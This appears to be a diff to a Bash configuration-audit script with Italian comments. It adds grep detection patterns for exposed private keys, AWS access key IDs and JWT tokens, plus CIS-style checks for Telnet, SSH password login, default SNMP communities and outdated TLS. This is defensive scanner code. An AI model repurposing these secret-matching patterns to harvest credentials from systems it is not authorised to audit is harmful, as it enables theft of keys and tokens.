+            echo "$plain_pass" | while IFS= read -r m; do found CRITICAL "  → $m"; done
             ((total_findings++)) || true
         fi
 
-        # 3. SIP senza TLS
+        # 4. Chiavi crittografiche esposte
+        if grep -q "BEGIN RSA PRIVATE KEY\|BEGIN PRIVATE KEY\|BEGIN EC PRIVATE KEY" "$cf" 2>/dev/null; then
+            found CRITICAL "CONFIG: chiave privata RSA/EC esposta in $cf"
+            ((total_findings++)) || true
+        fi
+        if grep -qP 'AKIA[A-Z0-9]{16}' "$cf" 2>/dev/null; then
+            found CRITICAL "CONFIG: AWS Access Key ID (AKIA...) trovato in $cf"
+            ((total_findings++)) || true
+        fi
+        if grep -qP 'eyJ[A-Za-z0-9+/=]{20,}\.[A-Za-z0-9+/=]{20,}' "$cf" 2>/dev/null; then
+            found HIGH "CONFIG: possibile JWT token trovato in $cf"
+            ((total_findings++)) || true
+        fi
+
+        # 5. CIS Benchmark checks base
+        # Telnet abilitato
+        if grep -qiP '(telnet\s+enable|service\s+telnet|telnet\s*=\s*on|enable\s+telnet)' "$cf" 2>/dev/null; then
+            found HIGH "CONFIG CIS: Telnet abilitato in $cf"
+            ((total_findings++)) || true
+        fi
+        # SSH PasswordAuthentication yes
+        if grep -qP '^PasswordAuthentication\s+yes' "$cf" 2>/dev/null; then
+            found MEDIUM "CONFIG CIS: SSH PasswordAuthentication=yes in $cf (brute force possibile)"
+            ((total_findings++)) || true
+        fi
+        # SNMP v1/v2 community default
+        if grep -qiP 'community\s+(public|private|community)' "$cf" 2>/dev/null; then
+            found HIGH "CONFIG CIS: community SNMP debole (public/private) in $cf"
+            ((total_findings++)) || true
+        fi
+        # TLS < 1.2
+        if grep -qiP 'TLSv1\.0|TLSv1\s*$|SSLv[23]|sslv3' "$cf" 2>/dev/null; then
+            found HIGH "CONFIG CIS: TLS < 1.2 configurato in $cf"
+            ((total_findings++)) || true
+        fi
+
+        # 6. Community SNMP deboli (già sopra, ma mantenuto per compatibilità)
+        # 7. SIP senza TLS
         if grep -qiP 'transport\s*=\s*UDP' "$cf" 2>/dev/null; then
             if ! grep -qiP 'transport\s*=\s*TLS' "$cf" 2>/dev/null; then
-                found MEDIUM "CONFIG: SIP con trasporto UDP senza TLS configurato in $cf"
+                found MEDIUM "CONFIG: SIP con trasporto UDP senza TLS in $cf"
                 ((total_findings++)) || true
             fi
         fi
 
-        # 4. Certificati TLS
+        # 8. Certificati TLS (file .pem/.crt/.cer)
         if [[ "$fname" =~ \.(pem|crt|cer)$ ]]; then
             if require_tool openssl; then
                 local cert_out="$output_dir/cert_$(basename "$cf").txt"
@@ -10398,26 +11186,10 @@ cmd_config_audit() {
             fi
         fi
 
-        # 5. Telnet abilitato
-        if grep -qiP '(telnet\s+enable|service\s+telnet|telnet\s*=\s*on|enable\s+telnet)' "$cf" 2>/dev/null; then
-            found HIGH "CONFIG: Telnet abilitato in $cf"
-            ((total_findings++)) || true
-        fi
-
-        # 6. Hash password MD5/DES deboli
-        if grep -qP '\$1\$[A-Za-z0-9./]{8}\$' "$cf" 2>/dev/null; then
-            found MEDIUM "CONFIG: hash password MD5 (\$1\$) rilevato in $cf — algoritmo debole"
-            ((total_findings++)) || true
-        fi
-        # DES (13 caratteri, pattern vecchio /etc/passwd)
-        if grep -qP '^[a-z_][a-z0-9_-]{0,31}:[A-Za-z0-9./]{13}:' "$cf" 2>/dev/null; then
-            found MEDIUM "CONFIG: hash DES (vecchio stile) rilevato in $cf"
-            ((total_findings++)) || true
-        fi
-
-        # 7. IP/hostname RFC1918 interni esposti
+        # 9. IP/hostname RFC1918 interni esposti
         local internal_ips
-        internal_ips=$(grep -oP '(10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.(1[6-9]|2[0-9]|3[01])\.[0-9]{1,3}\.[0-9]{1,3}|192\.168\.[0-9]{1,3}\.[0-9]{1,3})' "$cf" 2>/dev/null | sort -u | head -10 || true)
+        internal_ips=$(grep -oP '(10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.(1[6-9]|2[0-9]|3[01])\.[0-9]{1,3}\.[0-9]{1,3}|192\.168\.[0-9]{1,3}\.[0-9]{1,3})' \
+            "$cf" 2>/dev/null | sort -u | head -10 || true)
         if [[ -n "$internal_ips" ]]; then
             found LOW "CONFIG: IP RFC1918 interni esposti in $cf:"
             echo "$internal_ips" | while IFS= read -r ip; do
